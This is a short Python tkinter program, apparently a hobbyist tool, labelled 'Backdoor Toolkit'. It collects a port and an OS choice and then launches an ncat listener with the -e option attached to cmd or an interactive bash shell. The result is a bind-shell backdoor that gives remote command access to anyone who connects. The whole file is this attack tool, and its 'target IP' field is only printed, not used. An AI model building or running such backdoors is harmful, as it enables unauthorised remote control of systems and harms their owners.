import tkinter as tk
import subprocess

def run_script():
    # Get the values from the input fields
    target_ip = input1_field.get()
    target_port = input2_field.get()
    target_shell = input3_field.get()

    # Assign variables for Windows and Linux shells
    windows_shell = "cmd"
    linux_shell = "/bin/bash -i"

    # Simplified variable for Windows and Linux shells
    windows = windows_shell
    linux = linux_shell

    # If statement to designate specific shell, Windows or Linux ('cmd' or '/bin/bash -i')
    if target_shell == "windows" or target_shell == "WINDOWS" or target_shell == "Windows":
        target_shell = windows
    elif target_shell == "linux" or target_shell == "LINUX" or target_shell == "Linux":
        target_shell = linux

    # Define a function to open the Netcat listener utilizing the target IP, Port, and Shell
    def spawn_backdoor(target_port, target_shell):
        print("Now spawning Netcat Backdoor on", target_ip, "and port #", target_port)
        subprocess.call(["ncat", "-l", "-vv", "-k", "-p"+target_port, "-e"+target_shell])

    spawn_backdoor(target_port, target_shell)

# Create the main window
window = tk.Tk()
window.title("Backdoor Toolkit")

# Create the input fields
input1_label = tk.Label(window, text="Type the target's IP Address and press enter:")
input1_label.grid(row=0, column=0, padx=5, pady=5)
input1_field = tk.Entry(window)
input1_field.grid(row=0, column=1, padx=5, pady=5)

input2_label = tk.Label(window, text="Type the target's Port Number and press enter:")
input2_label.grid(row=1, column=0, padx=5, pady=5)
input2_field = tk.Entry(window)
input2_field.grid(row=1, column=1, padx=5, pady=5)

input3_label = tk.Label(window, text="Is the target a Windows or Linux device?")
input3_label.grid(row=2, column=0, padx=5, pady=5)
input3_field = tk.Entry(window)
input3_field.grid(row=2, column=1, padx=5, pady=5)

# Create the "Run" button
run_button = tk.Button(window, text="Run Script", command=run_script)
run_button.grid(row=3, column=0, columnspan=2, padx=5, pady=5)

window.mainloop()
